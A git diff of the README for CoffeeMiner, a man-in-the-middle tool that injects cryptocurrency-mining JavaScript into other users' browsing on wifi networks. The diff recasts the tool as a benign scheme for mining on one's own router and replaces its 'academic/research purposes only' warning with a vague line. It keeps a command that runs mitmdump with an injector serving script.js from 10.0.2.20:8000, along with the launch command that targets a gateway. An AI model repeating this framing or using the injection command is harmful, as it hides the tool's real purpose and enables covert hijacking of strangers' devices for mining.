@@ -1,12 +1,11 @@
 # CoffeeMiner
 
-Collaborative (mitm) cryptocurrency mining pool in wifi networks
+Collaborative (mitm) cryptocurrency mining pool for your wireless networks
 
-**Warning: this project is for academic/research purposes only.**
+**Warning: Don't use this project explicitly. Integrate on your own networks**
 
 ## Concept
 - Creating a mining algo to run on your Lan network, and use your router to mine while you aren't using your internet
-
 
 ## Use
 - install.sh
@@ -22,4 +21,3 @@ os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js
 ```
 python3 coffeeMiner.py ipgateway
 ```
-![demo](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-demo-cutted.gif "demo")
